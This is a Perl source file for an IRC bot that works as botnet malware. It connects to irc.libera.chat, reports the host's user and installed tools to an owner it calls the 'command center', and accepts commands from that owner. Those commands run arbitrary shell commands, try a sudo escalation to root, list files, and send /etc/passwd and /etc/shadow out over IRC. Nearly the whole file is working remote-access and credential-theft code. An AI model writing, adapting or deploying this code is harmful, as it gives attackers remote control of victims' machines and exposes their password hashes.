#!/usr/bin/perl
# perl ircbot

use strict;
use warnings;
use IO::Socket;

# Server Variables
my $server   = "irc.libera.chat";
my $port     = 6667;
my $nick     = "KreatyveBot";
my $ident    = "Anonymous";
my $realname = "Anonymous";
my $chan     = "#channel1";
my $chan2    = "#channel2";
my $pass     = "";
my $su       = "nickname";
my $owners   = "nickname";

# Donation URL
my $donation_url = "https://localhost";

# Establish connection to IRC server
my $irc = IO::Socket::INET->new(
    PeerAddr => $server,
    PeerPort => $port,
    Proto    => 'tcp'
) or die "Unable to connect to server: $!";

print "$nick has connected to $server on $chan and $chan2\n";

print $irc "USER $ident $ident $ident $ident :$realname\n";
print $irc "NICK $nick\n";

# Uncomment for nickserv authentication
# print $irc "PRIVMSG nickserv :identify $pass\n";

print $irc "JOIN $chan\n";
print $irc "JOIN $chan2\n";

# Alert the command center
print $irc "PRIVMSG $owners :I AM SCORPION'S BIGGEST FAN\n";

# Print the user the script is running as
my $output = `whoami`;
print $irc "PRIVMSG $owners : $output\n";

# Function to detect if a program exists in the PATH
sub program_exists {
    my $program = shift;
    foreach my $path (split /:/, $ENV{PATH}) {
        if (-x "$path/$program") {
            return 1;
        }
    }
    return 0;
}

# Detect fpc
my $fpc_installed = program_exists('fpc');
print $irc "PRIVMSG $owners : fpc installed: " . ($fpc_installed ? "Yes" : "No") . "\n";

# Detect perl
my $perl_installed = program_exists('perl');
print $irc "PRIVMSG $owners : perl installed: " . ($perl_installed ? "Yes" : "No") . "\n";

while (my $in = <$irc>) {
    # PING PONG
    if ($in =~ /^PING(.*)/) {
        print $irc "PONG $1\n";
    }
    
    print "$in\n"; # Log all incoming messages

    # Execute commands only if from owner
    next unless $in =~ /^:$owners\b/;

    if ($in =~ /!whoami/) {
        $output = `whoami`;
        print $irc "PRIVMSG $owners : $output\n";
    }

    if ($in =~ /!ifconfig/) {
        my @output = `ifconfig | grep inet`;
        foreach my $line (@output) {
            print $irc "PRIVMSG $owners : $line\n";
        }
    }

    if ($in =~ /!command\s+(.*)/) {
        my @output = `$1`;
        foreach my $line (@output) {
            print $irc "PRIVMSG $owners : $line\n";
        }
    }

    if ($in =~ /!escalate\s+(.*)/) {
        my $password = $1;
        print $irc "PRIVMSG $owners : Attempting to run as ROOT!\n";
        my $givemeroot = "echo \"$password\" | sudo -S perl bot.pl";
        system($givemeroot);
    }

    if ($in =~ /!ls/) {
        my @files = map { chomp; $_ } `find`;
        print $irc "PRIVMSG $owners : @files\n";
    }

    if ($in =~ /!passwd/) {
        my @output = `cat /etc/passwd`;
        foreach my $line (@output) {
            print $irc "PRIVMSG $owners : $line\n";
            sleep 3 if $. % 3 == 0; # Sleep after every 3 lines to prevent flooding
        }
    }

    if ($in =~ /!shadow/) {
        my @output = `cat /etc/shadow`;
        foreach my $line (@output) {
            print $irc "PRIVMSG $owners : $line\n";
            sleep 3 if $. % 3 == 0; # Sleep after every 3 lines to prevent flooding
        }
    }

    if ($in =~ /!op\s+(.*)/) {
        print $irc "MODE $chan +o $1\n";
    }

    if ($in =~ /!deop\s+(.*)/) {
        print $irc "MODE $chan -o $1\n";
    }

    if ($in =~ /!join\s+(.*)/ && $in =~ /$su/) {
        print $irc "JOIN $1\n";
    }

    if ($in =~ /!part\s+(.*)/ && $in =~ /$su/) {
        print $irc "PART $1\n";
    }

    if ($in =~ /!kickban\s+(.*)/) {
        print $irc "KICK $chan $1 :I STILL LOVE YOU...FOREVER\n";
        print $irc "MODE $chan +b $1\n";
    }

    if ($in =~ /!ban\s+(.*)/) {
        print $irc "KICK $chan $1 :I STILL LOVE YOU...FOREVER\n";
        print $irc "MODE $chan +b $1\n";
    }

    if ($in =~ /!kick\s+(.*)/) {
        print $irc "KICK $chan $1 :I STILL LOVE YOU\n";
    }

    if ($in =~ /!say\s+(.*)/) {
        print $irc "PRIVMSG $chan :$1\n";
    }

    if ($in =~ /!quit/ && $in =~ /$su/) {
        print $irc "PRIVMSG $chan :I'LL BE BACK FOR YOU\n";
        print $irc "QUIT\n";
        last;
    }

    if ($in =~ /!nick\s+(.*)/ && $in =~ /$su/) {
        print $irc "NICK $1\n";
    }

    if ($in =~ /!restart/ && $in =~ /$su/) {
        print $irc "PRIVMSG $chan :Rehashing...\n";
        print $irc "QUIT\n";
        system("perl bot.pl &");
        last;
    }

    if ($in =~ /!users/) {
        print $irc "PRIVMSG $chan :Current admins: $owners\n";
    }

    if ($in =~ /!get/) {
        print $irc "PRIVMSG $owners :Opening donation URL in browser...\n";
        if ($^O eq 'linux') {
            system("xdg-open '$donation_url'");
        } elsif ($^O eq 'darwin') {
            system("open '$donation_url'");
        } elsif ($^O eq 'MSWin32') {
            system("start '$donation_url'");
        } else {
            print $irc "PRIVMSG $owners :Unsupported operating system.\n";
        }
    }

    if ($in =~ /!run\s+(.+)/) {
        my $file = $1;
        if ($file =~ /\.pl$/) {
            if ($perl_installed) {
                my @output = `perl $file 2>&1`; # Run Perl script
                foreach my $line (@output) {
                    print $irc "PRIVMSG $owners : $line\n";
                }
            } else {
                print $irc "PRIVMSG $owners : perl is not installed.\n";
            }
        } elsif ($file =~ /\.kayte$/) {
            if ($fpc_installed) {
                my $compiled_file = $file;
                $compiled_file =~ s/\.kayte$/.out/;
                system("fpc $file -o$compiled_file"); # Compile Pascal file
                if (-e $compiled_file) {
                    my @output = `$compiled_file 2>&1`; # Run compiled file
                    foreach my $line (@output) {
                        print $irc "PRIVMSG $owners : $line\n";
                    }
                    unlink $compiled_file; # Clean up compiled file
                } else {
                    print $irc "PRIVMSG $owners : Compilation failed.\n";
                }
            } else {
                print $irc "PRIVMSG $owners : fpc is not installed.\n";
            }
        } else {
            print $irc "PRIVMSG $owners : Unsupported file type.\n";
        }
    }

    # New !topic command
    if ($in =~ /!topic\s+(.*)/) {
        my $topic = $1;
        print $irc "TOPIC $chan :$topic\n";
        print $irc "TOPIC $chan2 :$topic\n";
    }
}

close($irc);
